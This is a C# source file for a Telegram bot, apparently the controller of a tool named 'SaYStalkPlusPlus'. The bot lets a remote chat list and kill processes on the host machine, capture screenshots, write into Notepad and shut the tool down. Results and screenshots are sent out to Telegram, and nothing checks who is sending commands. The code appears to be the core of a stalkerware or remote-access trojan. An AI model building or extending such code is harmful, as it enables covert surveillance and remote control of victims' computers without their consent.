using Telegram.Bot.Polling;
using Telegram.Bot.Types.Enums;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Exceptions;
using SaYStalkPlusPlus.src.Commands;

namespace SaYStalkPlusPlus.src
{
    internal class Bot
    {

        private string _token;
        private CancellationTokenSource _cancellationToken;
        public delegate CommandResult CommandDelegate(string[] args);
        private static readonly Dictionary<string, CommandDelegate> commands = new Dictionary<string, CommandDelegate>{

            { "allProcesses", GetAllProcesses.Execute },
            { "activeProcesses", GetActiveProcesses.Execute},
            { "killProcess", KillProcess.Execute},
            { "killSSPP", KillSaYStalkPlusPlus.Execute},
            { "takeScreen", TakeScreen.Execute },
            { "notepad", OpenNotepadAndWrite.Execute },
            { "commands", ShowAllCommands },

        };
        const int MaxMessageLength = 4096;
        public Bot(string tokenString)
        {
            _token = tokenString;
            _cancellationToken = new CancellationTokenSource();
        }
        public async Task StartAsync()
        {
            var botClient = new TelegramBotClient(_token);
            ReceiverOptions receiverOptions = new()
            {
                AllowedUpdates = Array.Empty<UpdateType>()
            };

            botClient.StartReceiving(
                updateHandler: HandleUpdateAsync,
                pollingErrorHandler: HandlePollingErrorAsync,
                receiverOptions: receiverOptions,
                cancellationToken: _cancellationToken.Token
            );

        }
        private void StopBot() { _cancellationToken.Cancel(); }
        private static async Task SendMessage(ITelegramBotClient botClient, long chatId, string messageText)
        {


            if (messageText.Length <= MaxMessageLength)
                await botClient.SendTextMessageAsync(chatId, messageText);
            else
            {
                for (int i = 0; i < messageText.Length; i += MaxMessageLength)
                {
                    string chunk = messageText.Substring(i, Math.Min(MaxMessageLength, messageText.Length - i));
                    await botClient.SendTextMessageAsync(chatId, chunk);
                }
            }
        }
        private static async Task SendPhoto(ITelegramBotClient botClient, long chatId, string filePath)
        {
            using (var stream = new FileStream(filePath, FileMode.Open))
            {
                var fileToSend = new Telegram.Bot.Types.InputFileStream(stream);
                await botClient.SendPhotoAsync(chatId, fileToSend);
            }

        }

        private static async Task SendUnknownCommandMessage(ITelegramBotClient botClient, long chatId, string unknownCommand)
        {
            await botClient.SendTextMessageAsync(
                chatId: chatId,
                text: $"The \"{unknownCommand}\" command is unknown. To see a list of all available commands, send \"/commands\""
            );
        }
        private static async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
        {
            if (update.Message is not { } message) return;
            if (message.Text is not { } messageText) return;

            long chatId = message.Chat.Id;

            if (!messageText.StartsWith('/'))
            {
                await SendMessage(botClient, chatId, "ur msg: " + messageText);
                return;
            }
            await HandleCommand(botClient, cancellationToken, messageText, chatId);
        }
        private static Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
        {
            var ErrorMessage = exception switch
            {
                ApiRequestException apiRequestException
                    => $"Telegram API Error:\n[{apiRequestException.ErrorCode}]\n{apiRequestException.Message}",
                _ => exception.ToString()
            };

            Console.WriteLine(ErrorMessage);
            return Task.CompletedTask;
        }
        private static async Task HandleCommand(ITelegramBotClient botClient, CancellationToken cancellationToken, string commandText, long chatId)
        {
            string command = commandText.Split(' ')[0];
            if (command.Length > 1)
                command = command.Substring(1);
            if (commands.TryGetValue(command, out var executableCommand))
            {
                string?[] args = commandText.Split(" ")[1..];
                CommandResult result = executableCommand(args);
                if (result is null)   return;

                switch(result.Type)
                {
                    case CommandResultType.Text:
                        {
                            string messageText = result.Success ? result.ResultString : result.ErrorString;
                            if (!string.IsNullOrEmpty(messageText))
                                await SendMessage(botClient, chatId, messageText);
                            break;
                        }
                    case CommandResultType.Photo:
                        {
                            if(!result.Success)
                            {
                                string errorText= result.ErrorString;
                                await SendMessage(botClient, chatId, errorText);
                                return;
                            }
                            await SendPhoto(botClient, chatId, result.ResultString);
                            break;
                        }
                    default: return;
                }

               
            }
            else
            {
                await SendUnknownCommandMessage(botClient, chatId, command);
                return;
            }

        }
        private static CommandResult ShowAllCommands(string?[] args)
        {
            string stringToRetutn = "Avaliable commands: \n";
            foreach (string command in commands.Keys)
            {
                stringToRetutn += $"/{command} \n";
            }
            return new CommandResult(true, stringToRetutn, null);
        }

    }
}